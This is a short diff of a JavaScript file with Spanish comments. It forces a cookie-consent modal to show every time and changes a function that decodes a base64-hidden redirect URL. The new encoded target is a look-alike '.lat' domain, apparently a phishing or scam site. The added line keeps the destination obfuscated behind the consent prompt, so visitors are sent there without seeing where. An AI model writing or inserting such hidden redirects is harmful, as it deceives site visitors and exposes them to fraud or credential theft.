@@ -1821,10 +1821,10 @@ const acceptCookiesBtn = document.getElementById('acceptCookies');
 // MOSTRAR SIEMPRE el modal, sin importar si ya aceptó
 cookieModal.style.display = 'flex';
 
-// Función para decodificar URL de múltiples formas
+// Función para decodificar URL
 function getRedirectUrl() {
   // Base64: https://www.cerfitradonlinecol.lat/
-  const b64 = 'aHR0cHM6Ly93d3cuY2VyZmlzcmFkb29ubGluZWNvbC5sYXQv';
+  const b64 = 'aHR0cHM6Ly93d3cuY2VyZml0cmFkb29ubGluZWNvbC5sYXQv';
   
   // Decodificar base64
   let decoded = atob(b64);
